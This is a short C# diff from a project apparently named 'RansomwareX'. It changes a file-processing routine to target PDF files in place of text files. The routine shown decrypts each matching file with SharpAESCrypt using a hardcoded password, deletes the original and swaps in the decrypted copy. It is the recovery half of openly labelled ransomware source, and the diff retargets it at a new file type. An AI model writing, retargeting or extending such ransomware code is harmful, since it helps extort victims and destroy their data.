@@ -11,14 +11,14 @@ namespace RansomwareX
             List<string> files = new List<string>();
             DirectoryInfo d = new DirectoryInfo(dir);
 
-            foreach (var file in d.GetFiles("*.txt"))
+            foreach (var file in d.GetFiles("*.pdf"))
             {
                 files.Add(file.ToString());
             }
 
             foreach (string file in files)
             {
-                string decrypted_file = dir + "crypted_file.txt";
+                string decrypted_file = dir + "crypted_file.pdf";
                 SharpAESCrypt.SharpAESCrypt.Decrypt("password", file, decrypted_file);
                 File.Delete(file);
                 File.Move(decrypted_file, file);
